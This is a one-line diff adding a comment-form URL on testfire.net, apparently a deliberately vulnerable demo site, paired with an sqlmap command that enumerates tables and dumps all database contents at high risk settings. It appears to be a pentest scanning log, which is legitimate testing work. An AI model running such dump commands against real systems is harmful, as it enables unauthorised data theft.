@@ -1,0 +1,1 @@
+http://testfire.net/comment.aspx?cfile=comments.txt&name=+asdf&email_addr=asdf&subject=asdf&comments=asdf&submit=+Submit+ (GET)  # /usr/bin/sqlmap -u http://testfire.net/comment.aspx?cfile=comments.txt&name=+asdf&email_addr=asdf&subject=asdf&comments=asdf&submit=+Submit+ --tables --dump-all --output-dir=./sqlmap/ --level=2 --risk=3
